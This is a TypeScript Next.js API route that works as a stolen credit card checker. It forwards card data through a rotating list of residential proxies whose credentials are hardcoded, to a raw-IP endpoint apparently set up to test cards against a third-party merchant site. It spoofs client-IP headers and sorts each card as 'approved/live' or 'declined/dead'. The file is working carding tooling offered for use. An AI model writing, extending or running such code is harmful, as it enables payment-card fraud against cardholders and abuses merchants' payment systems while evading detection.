import { NextRequest, NextResponse } from 'next/server'
import { HttpsProxyAgent } from 'https-proxy-agent'
import { addCardResult, getCardSession } from '@/lib/database'

// Rotating residential proxy list
const proxyList = [
  'cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
  'dk-cop.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
  'ee-tal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
  'fi-esp.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
  'fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
  'de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2'
]

function getRandomProxy() {
  return proxyList[Math.floor(Math.random() * proxyList.length)]
}

function parseProxy(proxyString: string) {
  const [host, port, username, password] = proxyString.split(':')
  return {
    host,
    port: parseInt(port),
    username,
    password
  }
}

// Function to determine card status based on response
function determineCardStatus(responseText: string): 'approved' | 'declined' | 'unknown' {
  const lowerResponse = responseText.toLowerCase()
  
  // Check for JSON error responses
  try {
    const jsonResponse = JSON.parse(responseText)
    if (jsonResponse.code || jsonResponse.error || jsonResponse.message) {
      return 'declined'
    }
  } catch (e) {
    // Not JSON, continue with text analysis
  }

  // Check for specific error patterns in text
  const errorPatterns = [
    'invalid', 'error', 'incorrect', 'failed', 'declined', 'do not honor',
    'insufficient', 'expired', 'invalid_expiry', 'invalid_card', 'invalid_cvv'
  ]
  
  if (errorPatterns.some(pattern => lowerResponse.includes(pattern))) {
    return 'declined'
  }

  // Check for approval patterns
  const approvedKeywords = [
    "transaction successful", "payment is done", "payment successful", 
    "approved", "success", "charge success", "valid", "live"
  ]
  
  if (approvedKeywords.some(keyword => lowerResponse.includes(keyword))) {
    return 'approved'
  }

  // Check for decline patterns
  const declinedKeywords = [
    "declined", "incorrect card number", "insufficient funds", 
    "failed", "error", "do not honor", "invalid", "dead"
  ]
  
  if (declinedKeywords.some(keyword => lowerResponse.includes(keyword))) {
    return 'declined'
  }

  return 'unknown'
}

export async function POST(request: NextRequest) {
  let sessionId: string | undefined
  
  try {
    const body = await request.json()
    const { card } = body
    sessionId = body.sessionId
    
    if (!card) {
      return NextResponse.json({ error: 'Card data is required' }, { status: 400 })
    }

    const baseApiUrl = "http://67.205.184.198:9080/key=cc/site=dashboardpack.com/data="
    const apiUrl = `${baseApiUrl}${encodeURIComponent(card)}`

    // Get a random proxy
    const proxyString = getRandomProxy()
    const proxy = parseProxy(proxyString)

    // Create proxy agent
    const proxyUrl = `http://${proxy.username}:${proxy.password}@${proxy.host}:${proxy.port}`
    const agent = new HttpsProxyAgent(proxyUrl)

    // Create a timeout promise
    const timeoutPromise = new Promise((_, reject) => {
      setTimeout(() => reject(new Error('Request timeout')), 15000)
    })

    // Make the API request with proxy
    const fetchPromise = fetch(apiUrl, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
      },
      // @ts-ignore - Next.js fetch doesn't support agent, but we'll try
      agent: agent
    })

    // Race between fetch and timeout
    const response = await Promise.race([fetchPromise, timeoutPromise]) as Response

    const responseText = await response.text()
    console.log('API Response:', responseText)

    // Determine status using the new function
    const status = determineCardStatus(responseText)

    const result = {
      card,
      status,
      response: responseText,
      timestamp: new Date().toISOString()
    }

    // If sessionId is provided, add result to session
    if (sessionId) {
      addCardResult(sessionId, result)
    }

    return NextResponse.json(result)

  } catch (error) {
    console.error('Card check error:', error)
    
    let errorMessage = 'Unknown error'
    if (error instanceof Error) {
      if (error.message.includes('timeout')) {
        errorMessage = 'Request timeout'
      } else if (error.message.includes('fetch')) {
        errorMessage = 'Network error - API may be down or blocked'
      } else {
        errorMessage = error.message
      }
    }

    const result = {
      card: 'unknown',
      status: 'error' as const,
      response: `Error: ${errorMessage}`,
      timestamp: new Date().toISOString()
    }

    // If sessionId is provided, add error result to session
    if (sessionId) {
      addCardResult(sessionId, result)
    }

    return NextResponse.json(result, { status: 500 })
  }
} 